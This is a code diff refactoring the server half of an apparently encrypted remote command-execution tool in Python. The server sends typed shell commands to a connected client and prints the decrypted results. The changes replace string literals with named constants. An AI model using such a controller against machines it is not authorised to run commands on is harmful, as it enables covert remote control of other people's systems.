@@ -6,7 +6,7 @@ import settings.keys as keys
 import json
 from tools.packet_manager import p_manager
 import time
-from tools.dictionary import SEND_DELAY, MAX_SOCK_RECV
+from tools.dictionary import *
 from tools.utils import packet_send, packet_recv
 
 class baseServer():
@@ -40,7 +40,7 @@ class baseServer():
                             decrypt=True)
             except:
                 continue
-            print(packet['PLD'])
+            print(packet[PK_PAYLOAD_FLAG])
 
     def sender(self, conn, cipherClass):
         while(True):
@@ -48,7 +48,7 @@ class baseServer():
             if len(command) <= 0:
                 continue
             try:
-                packet_send(command='CMD',
+                packet_send(command=COMMAND_LINE_EXE,
                             payload=command,
                             cipherClass=cipherClass,
                             conn=conn,
@@ -61,7 +61,7 @@ class baseServer():
         while(True):
             try:
                 password = cipher.generateIV().hex()
-                packet_send(command="SRT",
+                packet_send(command=COMMAND_START,
                             payload=password,
                             cipherClass=cipherClass,
                             conn=conn)
@@ -71,7 +71,7 @@ class baseServer():
                             conn=conn,
                             decrypt=False)
 
-                if packet["CMD"] == "ACK" and packet["PLD"] == password:
+                if packet[PK_COMMAND_FLAG] == COMMAND_ACKNOWLEDGE and packet[PK_PAYLOAD_FLAG] == password:
                     break
                 else:
                     print("Configuration error. Socket returned a different Initialization Vector")
